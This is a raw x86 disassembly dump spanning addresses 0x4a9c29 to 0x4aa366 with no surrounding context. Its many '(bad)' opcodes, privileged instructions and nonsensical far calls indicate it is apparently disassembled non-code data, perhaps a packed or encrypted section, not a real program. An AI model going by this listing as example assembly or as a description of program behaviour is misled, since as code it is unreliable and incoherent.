  4a9c29:	and    BYTE PTR [esi-0x21c5fe7e],cl
  4a9c2f:	lock xchg ebx,eax
  4a9c31:	inc    edx
  4a9c32:	mov    cl,0x88
  4a9c34:	adc    BYTE PTR [ebx+0x4c36bd1b],al
  4a9c3a:	and    al,0x14
  4a9c3c:	je     0x4a9bcf
  4a9c3e:	outs   dx,BYTE PTR ds:[esi]
  4a9c3f:	clc    
  4a9c40:	sar    BYTE PTR [esp+edx*1+0x1bf98fba],cl
  4a9c47:	ror    BYTE PTR [ecx+0x4ef3a2b6],0xbb
  4a9c4e:	pop    esi
  4a9c4f:	das    
  4a9c50:	call   0x8a72:0x988b5a0c
  4a9c57:	(bad)  
  4a9c58:	add    ecx,DWORD PTR [eax-0x10ecaf41]
  4a9c5e:	cdq    
  4a9c5f:	lds    eax,FWORD PTR [eax]
  4a9c61:	xchg   ebx,eax
  4a9c62:	and    DWORD PTR [edx-0x5d],ebp
  4a9c65:	ins    DWORD PTR es:[edi],dx
  4a9c66:	mov    dl,0x2
  4a9c68:	(bad)  
  4a9c69:	sub    BYTE PTR [ebx],dl
  4a9c6b:	push   ecx
  4a9c6c:	stos   BYTE PTR es:[edi],al
  4a9c6d:	sub    al,0x21
  4a9c6f:	inc    ebp
  4a9c70:	popf   
  4a9c71:	sbb    al,0xeb
  4a9c73:	inc    ax
  4a9c75:	jns    0x4a9cad
  4a9c77:	test   DWORD PTR [eax],ecx
  4a9c79:	cmp    al,0xc
  4a9c7b:	and    DWORD PTR [ebx-0x27d20cff],ecx
  4a9c81:	pop    esi
  4a9c82:	and    BYTE PTR [esi],cl
  4a9c84:	lock push ebx
  4a9c86:	cmp    BYTE PTR [edi+0x594c589e],dl
  4a9c8c:	jne    0x4a9cb8
  4a9c8e:	xor    al,0x5b
  4a9c90:	clc    
  4a9c91:	jno    0x4a9c62
  4a9c93:	jmp    0x4a9ccc
  4a9c95:	mov    edx,DWORD PTR [edi]
  4a9c97:	or     ebp,DWORD PTR [ebx+0x66]
  4a9c9a:	add    DWORD PTR [esi-0x1dc4b3d2],eax
  4a9ca0:	xchg   DWORD PTR [esp+ebp*8+0x19],esi
  4a9ca4:	push   0x5
  4a9ca6:	pop    ss
  4a9ca7:	or     eax,0x8e07eb16
  4a9cac:	rcr    BYTE PTR [esi+0x12946e65],0x71
  4a9cb3:	mov    ecx,0xd851924
  4a9cb8:	mov    ecx,0xd354447f
  4a9cbd:	mov    ch,0x5e
  4a9cbf:	clc    
  4a9cc0:	mov    ds:0x1733878a,al
  4a9cc5:	cs popf 
  4a9cc7:	sysret 
  4a9cc9:	rcl    BYTE PTR [edx+ebx*4+0x4a],cl
  4a9ccd:	cdq    
  4a9cce:	add    DWORD PTR [ecx-0x3f2076fe],edx
  4a9cd4:	or     ebp,DWORD PTR [eax-0x117b68fd]
  4a9cda:	pop    es
  4a9cdb:	add    dl,BYTE PTR [ecx]
  4a9cdd:	fiadd  DWORD PTR ds:0xd8c86a8f
  4a9ce3:	or     al,BYTE PTR [ebp-0x1f2f67f9]
  4a9ce9:	lock arpl WORD PTR [ebp+0x16],cx
  4a9ced:	out    dx,eax
  4a9cee:	fwait
  4a9cef:	es sbb al,0xec
  4a9cf2:	dec    ecx
  4a9cf3:	push   ecx
  4a9cf4:	xor    DWORD PTR [esi+ebx*2],esi
  4a9cf7:	xchg   BYTE PTR [edx+0x52],cl
  4a9cfa:	mov    esp,0x6362ed29
  4a9cff:	sbb    esi,DWORD PTR [eax]
  4a9d01:	xchg   DWORD PTR [ecx+0x48],esi
  4a9d04:	push   eax
  4a9d05:	sub    DWORD PTR ds:0x53d2960b,ecx
  4a9d0b:	push   edx
  4a9d0c:	sbb    esi,DWORD PTR [eax]
  4a9d0e:	(bad)  
  4a9d0f:	loop   0x4a9d34
  4a9d11:	mov    ch,0x7f
  4a9d13:	dec    eax
  4a9d14:	xchg   esp,eax
  4a9d15:	leave  
  4a9d16:	add    eax,0xf0ac2c18
  4a9d1b:	jmp    0x4a9d46
  4a9d1d:	xlat   BYTE PTR ds:[ebx]
  4a9d1e:	adc    DWORD PTR [ebp+0x8a90ae1],esi
  4a9d24:	adc    ebx,DWORD PTR [eax-0x7aea2df2]
  4a9d2a:	xor    eax,0x67bad393
  4a9d2f:	mov    ebx,cs
  4a9d31:	mov    ds:0x56b2cb0,eax
  4a9d36:	push   cs
  4a9d37:	dec    esp
  4a9d38:	sahf   
  4a9d39:	push   edi
  4a9d3a:	icebp  
  4a9d3b:	mov    cl,0x6b
  4a9d3d:	nop
  4a9d3e:	cmp    esp,DWORD PTR [ecx+0x6b0659c8]
  4a9d44:	gs pop ds
  4a9d46:	shl    BYTE PTR [ebp+edi*2+0x721ea0b9],0xb0
  4a9d4e:	add    dl,ch
  4a9d50:	push   ecx
  4a9d51:	imul   BYTE PTR [esi+eax*1-0x36fbfab6]
  4a9d58:	add    eax,0x1f026840
  4a9d5d:	into   
  4a9d5e:	add    al,BYTE PTR ds:0x88602fa0
  4a9d64:	add    al,0x67
  4a9d66:	lock sbb DWORD PTR [ebp-0x4c],eax
  4a9d6a:	xor    al,0x80
  4a9d6c:	leave  
  4a9d6d:	ins    BYTE PTR es:[edi],dx
  4a9d6e:	adc    DWORD PTR es:[ebp+0x5c132552],ecx
  4a9d75:	gs xchg ecx,eax
  4a9d77:	adc    DWORD PTR [eax+0x41815798],0x4b
  4a9d7e:	ret    0xa2b
  4a9d81:	imul   esi,DWORD PTR [ebx],0x80a86a2a
  4a9d87:	jb     0x4a9d20
  4a9d89:	add    dl,BYTE PTR [edx+0x5da5bf84]
  4a9d8f:	stos   BYTE PTR es:[edi],al
  4a9d90:	mov    es,esp
  4a9d92:	mov    ah,0x81
  4a9d94:	mov    al,0xee
  4a9d97:	dec    edx
  4a9d98:	or     al,0x6b
  4a9d9a:	scas   al,BYTE PTR es:[edi]
  4a9d9b:	pop    ss
  4a9d9c:	cmp    ebx,eax
  4a9d9e:	scas   eax,DWORD PTR es:[edi]
  4a9d9f:	and    ah,cl
  4a9da1:	push   es
  4a9da2:	aad    0x6c
  4a9da4:	or     DWORD PTR [eax],esi
  4a9da6:	jbe    0x4a9d3d
  4a9da8:	or     eax,0xf82389b9
  4a9dad:	pop    ebx
  4a9dae:	aaa    
  4a9daf:	add    eax,0x4780c1c
  4a9db4:	jg     0x4a9d44
  4a9db6:	(bad)  
  4a9db7:	dec    edx
  4a9db8:	nop
  4a9db9:	cmp    dh,BYTE PTR [ebx]
  4a9dbb:	mov    ds:0xfb4bc6dc,eax
  4a9dc0:	add    DWORD PTR [edi+0x7f170d89],edi
  4a9dc6:	test   BYTE PTR [esi+eax*8-0x74],dl
  4a9dca:	cmp    DWORD PTR [eax],edi
  4a9dcc:	loopne 0x4a9dd0
  4a9dce:	shld   edx,edx,0xec
  4a9dd2:	or     BYTE PTR [eax+esi*1+0x0],dh
  4a9dd6:	or     ah,BYTE PTR [edx+0x6f]
  4a9dd9:	out    dx,eax
  4a9dda:	fild   DWORD PTR [ecx-0x32]
  4a9ddd:	or     eax,0x321c288
  4a9de2:	ins    BYTE PTR es:[edi],dx
  4a9de3:	pop    ecx
  4a9de4:	fadd   DWORD PTR [ecx-0x76df8e45]
  4a9dea:	data16 xor dh,BYTE PTR [eax-0x147d10c3]
  4a9df1:	mov    esp,0xd4fcc6ad
  4a9df6:	dec    edi
  4a9df7:	and    ah,BYTE PTR [ecx]
  4a9df9:	mov    DWORD PTR [esi],edi
  4a9dfb:	xchg   ebx,eax
  4a9dfc:	adc    BYTE PTR [esi],bl
  4a9dfe:	and    eax,0x283f4443
  4a9e03:	cmp    DWORD PTR es:[edi+0x1d],edx
  4a9e07:	les    ecx,FWORD PTR [edx+0x7d]
  4a9e0a:	xchg   ebx,eax
  4a9e0b:	push   esi
  4a9e0c:	and    eax,0x93ff9227
  4a9e11:	push   DWORD PTR [eax+0x7d121de4]
  4a9e17:	lods   al,BYTE PTR ds:[esi]
  4a9e18:	dec    esi
  4a9e19:	outs   dx,BYTE PTR ds:[esi]
  4a9e1a:	sbb    edi,edx
  4a9e1c:	xchg   esp,eax
  4a9e1d:	jae    0x4a9dd4
  4a9e1f:	sub    DWORD PTR [edx-0xa953e80],eax
  4a9e25:	mov    al,ds:0x78110475
  4a9e2a:	push   0xf07a52a2
  4a9e2f:	enter  0x4706,0xbd
  4a9e33:	call   0x5f59f33
  4a9e38:	loope  0x4a9e9d
  4a9e3a:	and    al,0xf3
  4a9e3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a9e3d:	sub    eax,0x8c4b5ab0
  4a9e42:	fld    st(1)
  4a9e44:	fadd   QWORD PTR [edx]
  4a9e46:	cs stos DWORD PTR es:[edi],eax
  4a9e48:	test   al,0x51
  4a9e4a:	add    BYTE PTR [esi+0x54],0xd3
  4a9e4e:	xchg   esp,eax
  4a9e4f:	xchg   ebx,eax
  4a9e50:	je     0x4a9e2f
  4a9e52:	leave  
  4a9e53:	push   ecx
  4a9e54:	pop    ebx
  4a9e55:	ja     0x4a9df7
  4a9e57:	cmc    
  4a9e58:	xchg   ecx,eax
  4a9e59:	jnp    0x4a9ec3
  4a9e5b:	cmp    BYTE PTR [ebp-0x47e3cf1c],bl
  4a9e61:	sub    BYTE PTR [edx],ch
  4a9e63:	(bad)  
  4a9e64:	pop    edx
  4a9e65:	xchg   DWORD PTR [edi],eax
  4a9e67:	or     BYTE PTR [esp+ecx*4+0x19],ah
  4a9e6b:	mov    bh,0x18
  4a9e6d:	add    edx,DWORD PTR [eax-0x7bab8742]
  4a9e73:	adc    DWORD PTR [ebx],ecx
  4a9e75:	push   eax
  4a9e76:	or     eax,0x6be2864
  4a9e7b:	je     0x4a9dfd
  4a9e7d:	push   0x75645696
  4a9e82:	inc    esp
  4a9e83:	fadd   DWORD PTR [eax-0x55]
  4a9e86:	test   eax,0x189c0a8e
  4a9e8b:	push   esp
  4a9e8c:	cmp    al,0x25
  4a9e8e:	sub    BYTE PTR [esi+0x64],0xd8
  4a9e92:	xchg   ebp,eax
  4a9e93:	inc    ecx
  4a9e94:	sub    BYTE PTR [eax+eiz*8+0x1d02666f],ah
  4a9e9b:	adc    al,0xe9
  4a9e9d:	cli    
  4a9e9e:	or     BYTE PTR [ebx],al
  4a9ea0:	je     0x4a9eb0
  4a9ea2:	dec    ecx
  4a9ea3:	mov    bh,0x1b
  4a9ea5:	sub    DWORD PTR [edi+0x60],0xffffff8b
  4a9ea9:	bnd jmp 0x4a9ebf
  4a9eac:	mov    esi,0xdbebe50
  4a9eb1:	or     eax,0x73bac87c
  4a9eb6:	add    eax,0xd1a603be
  4a9ebb:	lahf   
  4a9ebc:	and    edx,DWORD PTR [ebx]
  4a9ebe:	add    BYTE PTR [ecx-0x5601fdfd],dh
  4a9ec4:	lock add ax,WORD PTR [esi+eax*1]
  4a9ec9:	jmp    0x3d68:0x19a95627
  4a9ed0:	jo     0x4a9f21
  4a9ed2:	cmp    BYTE PTR [edi-0x5af62298],ch
  4a9ed8:	mov    esi,0x4967081d
  4a9edd:	inc    esi
  4a9ede:	bound  ebx,QWORD PTR [ebx]
  4a9ee0:	xor    ebp,DWORD PTR [ebx+0x69]
  4a9ee3:	add    eax,0x898010bf
  4a9ee8:	(bad)  
  4a9ee9:	ficom  DWORD PTR [eax]
  4a9eeb:	mov    BYTE PTR [eax+0x10],dl
  4a9eee:	inc    edi
  4a9eef:	or     ebx,DWORD PTR [ebx+0x4c110c79]
  4a9ef5:	push   ecx
  4a9ef6:	adc    al,0x48
  4a9ef8:	repnz arpl WORD PTR [ebx-0x3d],ax
  4a9efc:	dec    ecx
  4a9efd:	sbb    dh,dh
  4a9eff:	sbb    BYTE PTR ds:0x88721cc1,bh
  4a9f05:	in     al,0x54
  4a9f07:	xchg   esi,eax
  4a9f08:	and    DWORD PTR [esi-0x1bffcea0],edx
  4a9f0e:	inc    ebp
  4a9f0f:	xchg   esi,eax
  4a9f10:	pusha  
  4a9f11:	xchg   edi,eax
  4a9f12:	jno    0x4a9f4c
  4a9f14:	mov    ch,0xb7
  4a9f16:	jle    0x4a9f20
  4a9f18:	je     0x4a9f3a
  4a9f1a:	or     eax,0xbbd086bd
  4a9f1f:	mov    dl,0xc2
  4a9f21:	mov    ecx,0x7a112a15
  4a9f26:	ret    
  4a9f27:	mov    eax,0xd69b7a
  4a9f2c:	mov    ds:0x494e2276,al
  4a9f31:	add    al,0x25
  4a9f33:	clc    
  4a9f34:	add    BYTE PTR [ebx-0x7715a3a8],al
  4a9f3a:	enter  0xe322,0x24
  4a9f3e:	adc    eax,DWORD PTR ss:[ebx+0x5f]
  4a9f42:	adc    edx,DWORD PTR es:[ebx+0x93448ae]
  4a9f49:	fsub   st(4),st
  4a9f4b:	pop    edx
  4a9f4c:	inc    ecx
  4a9f4d:	add    edx,DWORD PTR [esi]
  4a9f4f:	je     0x4a9f9a
  4a9f51:	or     eax,0x203ad1b4
  4a9f56:	pop    ds
  4a9f57:	jb     0x4a9f67
  4a9f59:	sbb    BYTE PTR [edi],ah
  4a9f5b:	push   es
  4a9f5c:	and    eax,0x89ecf5b1
  4a9f61:	(bad)  
  4a9f62:	int    0x6
  4a9f64:	xor    cl,BYTE PTR [eax]
  4a9f66:	add    edi,ecx
  4a9f68:	jne    0x4a9f75
  4a9f6a:	and    BYTE PTR [ecx-0x70],ch
  4a9f6d:	sar    BYTE PTR [edi],0xb
  4a9f70:	call   0x3254:0x8ea79c55
  4a9f77:	stc    
  4a9f78:	push   ds
  4a9f79:	fmul   st(6),st
  4a9f7b:	push   esi
  4a9f7c:	loope  0x4a9faf
  4a9f7e:	xchg   ecx,eax
  4a9f7f:	psadbw mm1,QWORD PTR [edi]
  4a9f82:	rcr    BYTE PTR [ebp-0x244a7d7c],cl
  4a9f88:	mov    DWORD PTR [eax],edi
  4a9f8a:	mov    bl,0x31
  4a9f8c:	add    cl,BYTE PTR [esi]
  4a9f8e:	cmp    esp,DWORD PTR [ecx]
  4a9f90:	add    eax,0x7c842a4e
  4a9f95:	or     eax,0xaa1204bb
  4a9f9a:	pusha  
  4a9f9b:	xchg   esp,eax
  4a9f9c:	jle    0x4a9fc5
  4a9f9e:	bound  esi,QWORD PTR [ecx+0x21be544e]
  4a9fa4:	adc    BYTE PTR [esi+0x69],ah
  4a9fa7:	sbb    BYTE PTR [eax-0x5b9f07f],ah
  4a9fad:	out    dx,eax
  4a9fae:	push   ecx
  4a9faf:	iret   
  4a9fb0:	push   ss
  4a9fb1:	je     0x4a9fda
  4a9fb3:	adc    al,0xe
  4a9fb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a9fb6:	jnp    0x4a9ff2
  4a9fb8:	mov    eax,ds:0x45260c4c
  4a9fbd:	in     al,0xb7
  4a9fbf:	test   BYTE PTR [esi],al
  4a9fc1:	or     eax,0x28291157
  4a9fc6:	sbb    al,0x78
  4a9fc8:	in     al,0xf4
  4a9fca:	pop    ebp
  4a9fcb:	mov    al,bl
  4a9fcd:	aaa    
  4a9fce:	mov    ds:0x7bd76936,eax
  4a9fd3:	push   edi
  4a9fd4:	inc    ecx
  4a9fd5:	adc    eax,0x74586f12
  4a9fda:	mov    bh,0xd2
  4a9fdc:	gs push 0x65f88727
  4a9fe2:	out    0x3d,eax
  4a9fe4:	enter  0x6040,0x91
  4a9fe8:	cs mov dh,0x7a
  4a9feb:	div    DWORD PTR [edx+0x6abfa380]
  4a9ff1:	push   0x5
  4a9ff3:	push   edi
  4a9ff4:	out    0x40,eax
  4a9ff6:	adc    BYTE PTR [edx+0x200cd8bc],al
  4a9ffc:	mov    dl,0x9e
  4a9ffe:	or     eax,esp
  4aa000:	mov    cl,0xfd
  4aa002:	cld    
  4aa003:	jle    0x4aa02b
  4aa005:	xor    BYTE PTR [ecx+edx*1+0x14cb1d74],ah
  4aa00c:	out    dx,eax
  4aa00d:	jo     0x4aa05a
  4aa00f:	dec    eax
  4aa010:	adc    BYTE PTR ds:0x570a07d5,cl
  4aa016:	jnp    0x4aa00c
  4aa018:	push   edx
  4aa019:	inc    ebx
  4aa01a:	add    BYTE PTR [ecx-0x378d5a7c],ch
  4aa020:	sub    dh,ah
  4aa022:	pop    ebp
  4aa023:	mov    WORD PTR [ebx+ecx*2-0x7e147efd],es
  4aa02a:	cmp    BYTE PTR [ebx],cl
  4aa02c:	and    ah,BYTE PTR [edx]
  4aa02e:	loop   0x4a9ffc
  4aa030:	lock jecxz 0x4aa053
  4aa033:	mov    dh,0x53
  4aa035:	cwde   
  4aa036:	push   edx
  4aa037:	inc    edi
  4aa038:	pop    esi
  4aa039:	jo     0x4a9fc6
  4aa03b:	dec    edi
  4aa03c:	or     eax,0x9af5b528
  4aa041:	xor    BYTE PTR [eax+0x2803503b],dh
  4aa047:	adc    al,0x49
  4aa049:	mov    BYTE PTR [eax-0x50],bh
  4aa04c:	les    esp,FWORD PTR [esi]
  4aa04e:	xor    al,BYTE PTR [eax+0x500432e4]
  4aa054:	adc    DWORD PTR [eax+0x6096f875],0x2238079b
  4aa05e:	bound  edi,QWORD PTR [ecx]
  4aa060:	pop    ebx
  4aa061:	push   ss
  4aa062:	stc    
  4aa063:	adc    eax,0x1e08b57
  4aa068:	loope  0x4aa000
  4aa06a:	pusha  
  4aa06b:	jbe    0x4aa0cd
  4aa06d:	push   edx
  4aa06e:	adc    eax,0xae2d2d05
  4aa073:	push   0xe2f00d6c
  4aa078:	fnstenv [ecx+0x569c1df4]
  4aa07e:	ja     0x4aa096
  4aa080:	jmp    0x4aa0ca
  4aa082:	cwde   
  4aa083:	sbb    edx,DWORD PTR [eax+0x47]
  4aa086:	cmp    al,0x74
  4aa088:	dec    ebx
  4aa089:	aam    0x7a
  4aa08b:	dec    edx
  4aa08c:	dec    edx
  4aa08d:	dec    esi
  4aa08e:	sbb    bh,al
  4aa090:	or     dl,dl
  4aa092:	ds mov esp,0x478e0875
  4aa098:	sbb    al,0x4f
  4aa09a:	adc    al,0x38
  4aa09c:	push   ebp
  4aa09d:	dec    esi
  4aa09e:	push   esi
  4aa09f:	push   edi
  4aa0a0:	xor    DWORD PTR [eax+edx*2+0x58],edi
  4aa0a4:	imul   ecx,DWORD PTR [edi-0x5e],0xffffffa0
  4aa0a8:	jo     0x4aa0dc
  4aa0aa:	adc    BYTE PTR [edi-0x4d],dl
  4aa0ad:	sbb    eax,0x5434c8c
  4aa0b2:	adc    BYTE PTR [edi*8+0x10040007],ch
  4aa0b9:	xchg   esp,eax
  4aa0ba:	mov    eax,0x9b42140d
  4aa0bf:	mov    eax,0x70a8d654
  4aa0c4:	and    BYTE PTR [eax],bl
  4aa0c6:	sbb    al,0xc
  4aa0c8:	dec    esi
  4aa0c9:	div    eax
  4aa0cb:	rcl    BYTE PTR [ecx+0x77],1
  4aa0ce:	dec    ecx
  4aa0cf:	inc    edi
  4aa0d0:	not    DWORD PTR [ecx-0x5e]
  4aa0d3:	js     0x4aa126
  4aa0d5:	push   edx
  4aa0d6:	fs and al,0x29
  4aa0da:	mov    esp,0x728c0beb
  4aa0df:	cwde   
  4aa0e0:	(bad)  
  4aa0e1:	or     al,0x8b
  4aa0e3:	dec    esi
  4aa0e4:	pop    ebx
  4aa0e5:	add    al,0x71
  4aa0e7:	sbb    DWORD PTR [ecx-0x279b0fe4],ebp
  4aa0ed:	pop    ebp
  4aa0ee:	fild   DWORD PTR [edx-0x12dcfaf]
  4aa0f4:	push   ebx
  4aa0f5:	or     al,0x5d
  4aa0f7:	mov    eax,ds:0xb1600096
  4aa0fc:	push   edi
  4aa0fd:	or     cl,BYTE PTR [ecx]
  4aa0ff:	dec    edi
  4aa100:	shr    eax,0x47
  4aa103:	adc    eax,0x207ac9da
  4aa108:	pop    edx
  4aa109:	dec    ebp
  4aa10a:	cs cmp eax,0x563e5ce2
  4aa110:	ds pop ds
  4aa112:	push   ebx
  4aa113:	mov    eax,0x40057804
  4aa118:	sub    al,0x49
  4aa11a:	mov    bl,cl
  4aa11c:	inc    ecx
  4aa11d:	loope  0x4aa0a5
  4aa11f:	test   dh,ah
  4aa121:	cmp    BYTE PTR [edx],dh
  4aa123:	and    DWORD PTR [ebx+0x74],eax
  4aa126:	and    esi,DWORD PTR [ebx+0x53]
  4aa129:	push   ebx
  4aa12a:	call   0xf650bd5a
  4aa12f:	xchg   ecx,eax
  4aa130:	fcom   DWORD PTR [ecx+0x49]
  4aa133:	sahf   
  4aa134:	xchg   edx,eax
  4aa135:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4aa136:	jb     0x4aa18b
  4aa138:	adc    BYTE PTR [ebp-0x28],dl
  4aa13b:	push   edx
  4aa13c:	sub    ah,ah
  4aa13e:	mov    ds:0x290014c5,al
  4aa143:	push   edi
  4aa144:	and    dl,BYTE PTR [ebx+0x57]
  4aa147:	pop    esp
  4aa148:	adc    al,0xd8
  4aa14a:	inc    ebx
  4aa14b:	jae    0x4aa15a
  4aa14d:	ins    DWORD PTR es:[edi],dx
  4aa14e:	push   ebp
  4aa14f:	ret    0x6ba
  4aa152:	enter  0x52f8,0x77
  4aa156:	xchg   ebx,eax
  4aa157:	xchg   ebx,eax
  4aa158:	out    dx,al
  4aa159:	sbb    DWORD PTR [ebx],0xf
  4aa15c:	and    BYTE PTR [eax],dh
  4aa15e:	xchg   ebp,eax
  4aa15f:	pop    esp
  4aa160:	adc    BYTE PTR [ebx+0x608b5040],0x1e
  4aa167:	pusha  
  4aa168:	jecxz  0x4aa111
  4aa16a:	rcl    DWORD PTR [esi],cl
  4aa16c:	dec    ebp
  4aa16d:	mov    eax,ds:0xa267bcf5
  4aa172:	or     DWORD PTR [ebp-0x349da782],ecx
  4aa178:	inc    esp
  4aa179:	xchg   esp,eax
  4aa17a:	and    esi,DWORD PTR [eax+0x20d7d9f0]
  4aa180:	lea    esi,[eax+0x15]
  4aa183:	add    al,BYTE PTR [ebx+0x66]
  4aa186:	cmp    eax,0xab69b866
  4aa18b:	or     BYTE PTR [edi],bh
  4aa18d:	or     dl,BYTE PTR [eax]
  4aa18f:	adc    bh,bh
  4aa191:	add    bl,BYTE PTR [edx+0x2f4769a6]
  4aa197:	xor    bl,BYTE PTR [eax]
  4aa199:	sbb    BYTE PTR [esp+ebx*1],bl
  4aa19c:	imul   ecx,DWORD PTR [ebp-0x5b],0x24202069
  4aa1a3:	and    al,0xa
  4aa1a5:	sub    BYTE PTR [ecx+0x6],dl
  4aa1a8:	call   0xe161:0x2c2c28a6
  4aa1af:	retf   0x26b8
  4aa1b2:	mov    DWORD PTR [eax+0x30],ecx
  4aa1b5:	lods   eax,DWORD PTR ds:[esi]
  4aa1b6:	jp     0x4aa1bf
  4aa1b8:	inc    esp
  4aa1ba:	or     eax,DWORD PTR [esp+ebx*4]
  4aa1bd:	mov    edi,0x5034478d
  4aa1c2:	sbb    BYTE PTR [ecx+0x19],dl
  4aa1c5:	adc    dl,ch
  4aa1c7:	jb     0x4aa162
  4aa1c9:	cmp    dl,BYTE PTR [esi+0x68]
  4aa1cc:	or     BYTE PTR [edx-0x78],bh
  4aa1cf:	jo     0x4aa1b9
  4aa1d1:	mov    ah,0x80
  4aa1d3:	inc    ebp
  4aa1d4:	pop    ss
  4aa1d5:	xor    eax,0x7f524e10
  4aa1da:	je     0x4aa165
  4aa1dc:	mov    edi,?
  4aa1de:	pop    es
  4aa1df:	nop
  4aa1e0:	popa   
  4aa1e1:	dec    edx
  4aa1e2:	xchg   ecx,eax
  4aa1e3:	sbb    eax,0xda125b68
  4aa1e8:	mov    eax,ds:0xe8738d27
  4aa1ed:	add    ebx,DWORD PTR [edx-0x3565965a]
  4aa1f3:	add    al,0x8
  4aa1f5:	or     al,0x10
  4aa1f7:	adc    al,0x18
  4aa1f9:	xor    al,0x67
  4aa1fb:	sbb    ch,BYTE PTR [eax+0x1c]
  4aa1fe:	and    DWORD PTR [edx+0x10],eax
  4aa201:	loop   0x4aa197
  4aa203:	shl    BYTE PTR ss:[ecx+eiz*2],1
  4aa207:	inc    esp
  4aa208:	push   eax
  4aa209:	mov    edi,0x46f354d9
  4aa20e:	push   ss
  4aa20f:	mov    bl,BYTE PTR [esi+edx*8]
  4aa212:	pop    eax
  4aa213:	xor    esi,esi
  4aa215:	push   edx
  4aa216:	mov    DWORD PTR [ebx-0x80],esi
  4aa219:	(bad)  
  4aa21a:	cli    
  4aa21b:	mov    edi,0x209d2254
  4aa220:	mov    al,BYTE PTR [ebp+0x18]
  4aa223:	mov    BYTE PTR [ebx+0x7f144ad0],al
  4aa229:	pop    ebx
  4aa22a:	sub    eax,0x73a665
  4aa22f:	mov    bl,0xd4
  4aa231:	and    dh,BYTE PTR [edi-0x5c353bba]
  4aa237:	mov    DWORD PTR [ebx-0x3f3c7316],eax
  4aa23d:	xchg   ecx,eax
  4aa23e:	js     0x4aa2b3
  4aa240:	cmp    BYTE PTR [eax-0x64a9f76d],cl
  4aa246:	(bad)  
  4aa247:	mov    edx,0x30438822
  4aa24c:	lods   al,BYTE PTR ds:[esi]
  4aa24d:	test   dl,al
  4aa24f:	je     0x4aa1f9
  4aa251:	dec    ebx
  4aa252:	push   esp
  4aa253:	sti    
  4aa254:	ds and al,0x81
  4aa257:	fldcw  WORD PTR [eax+0x69301502]
  4aa25d:	add    al,0x74
  4aa25f:	mov    ah,ch
  4aa261:	pop    ss
  4aa262:	xchg   edx,eax
  4aa263:	cmp    BYTE PTR [edi],al
  4aa265:	or     DWORD PTR [ebx+0x54],edx
  4aa268:	or     al,0xbc
  4aa26a:	adc    DWORD PTR [ebp+0x35],ebp
  4aa26d:	add    al,0x2c
  4aa26f:	add    al,0x83
  4aa271:	cmp    BYTE PTR [edx],al
  4aa273:	gs test ebx,edi
  4aa276:	inc    ebp
  4aa277:	js     0x4aa23f
  4aa279:	add    DWORD PTR [ebp-0x5ee382e2],0x31
  4aa280:	mov    cl,0x80
  4aa282:	mov    ebp,0x9c2a338c
  4aa287:	inc    edx
  4aa288:	pop    esi
  4aa289:	das    
  4aa28a:	fld    TBYTE PTR [edx+0x10]
  4aa28d:	cmc    
  4aa28e:	mov    ds:0x2221a1a2,al
  4aa293:	xchg   DWORD PTR [esi+0x5c],edx
  4aa296:	adc    BYTE PTR es:[edi],dh
  4aa299:	mov    esp,esp
  4aa29b:	inc    eax
  4aa29c:	pop    ss
  4aa29d:	adc    eax,0x8124579e
  4aa2a2:	push   ebp
  4aa2a3:	leave  
  4aa2a4:	sahf   
  4aa2a5:	push   edi
  4aa2a6:	push   ecx
  4aa2a7:	dec    ebp
  4aa2a8:	add    DWORD PTR [ecx],ebp
  4aa2aa:	aas    
  4aa2ab:	call   0x637e:0xa2cbeed9
  4aa2b2:	push   esi
  4aa2b3:	add    ebx,0x29c953e0
  4aa2b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4aa2ba:	test   al,0xa7
  4aa2bc:	lods   al,BYTE PTR ds:[esi]
  4aa2bd:	das    
  4aa2be:	add    edi,edx
  4aa2c0:	cwde   
  4aa2c1:	jl     0x4aa2db
  4aa2c3:	nop
  4aa2c4:	add    BYTE PTR [ebp+0x18b450a4],bh
  4aa2ca:	pop    eax
  4aa2cb:	push   edi
  4aa2cc:	push   ecx
  4aa2cd:	push   0x869698d
  4aa2d2:	xchg   edi,eax
  4aa2d3:	(bad)  
  4aa2d4:	push   0x292731e2
  4aa2d9:	cmp    al,0xd4
  4aa2db:	adc    BYTE PTR [edi],bl
  4aa2dd:	push   ecx
  4aa2de:	add    bh,ch
  4aa2e0:	adc    al,0x36
  4aa2e2:	ret    
  4aa2e3:	or     DWORD PTR [ebp+0x2d39413f],ecx
  4aa2e9:	ret    
  4aa2ea:	imul   ebp,DWORD PTR [ecx-0x54bb1188],0x2d622256
  4aa2f4:	out    dx,eax
  4aa2f5:	pop    es
  4aa2f6:	stos   BYTE PTR es:[edi],al
  4aa2f7:	xor    DWORD PTR [ecx],edx
  4aa2f9:	xchg   DWORD PTR [edi],esp
  4aa2fb:	sti    
  4aa2fc:	pushf  
  4aa2fd:	hlt    
  4aa2fe:	xchg   esi,eax
  4aa2ff:	pop    esi
  4aa300:	adc    eax,0x84ec8127
  4aa305:	jne    0x4aa337
  4aa307:	mov    al,ds:0x2bf51b52
  4aa30c:	sbb    al,0x25
  4aa30e:	je     0x4aa326
  4aa310:	xchg   BYTE PTR [esi+0x27],ch
  4aa313:	pop    ds
  4aa314:	push   edx
  4aa315:	xor    DWORD PTR [eax+0x38],ecx
  4aa318:	lods   al,BYTE PTR ds:[esi]
  4aa319:	dec    edi
  4aa31a:	fidiv  WORD PTR [edx+edi*1]
  4aa31d:	add    ah,bh
  4aa31f:	mov    ch,0x43
  4aa321:	and    eax,0x461e0430
  4aa326:	pushf  
  4aa327:	in     al,dx
  4aa328:	pop    edx
  4aa329:	packssdw mm6,QWORD PTR [eax+0x40420559]
  4aa330:	add    ch,BYTE PTR [bx+si+0x455a]
  4aa335:	stos   DWORD PTR es:[edi],eax
  4aa336:	dec    ebp
  4aa337:	clc    
  4aa338:	(bad)  
  4aa339:	jle    0x4aa33f
  4aa33b:	pop    esi
  4aa33c:	push   eax
  4aa33d:	lock sbb eax,DWORD PTR es:[edi]
  4aa341:	jne    0x4aa393
  4aa343:	call   0xfa304bd5
  4aa348:	(bad)  [eax+0x3]
  4aa34b:	pop    ds
  4aa34c:	pop    ds
  4aa34d:	jne    0x4aa38f
  4aa34f:	push   0x8
  4aa351:	or     al,BYTE PTR [ecx+0x41adbe4b]
  4aa357:	jne    0x4aa387
  4aa359:	and    ebp,DWORD PTR [ecx]
  4aa35b:	sbb    al,0x3c
  4aa35d:	int    0x7d
  4aa35f:	test   eax,0xc68130ad
  4aa364:	and    esi,DWORD PTR [edi]
  4aa366:	je     0x4aa353
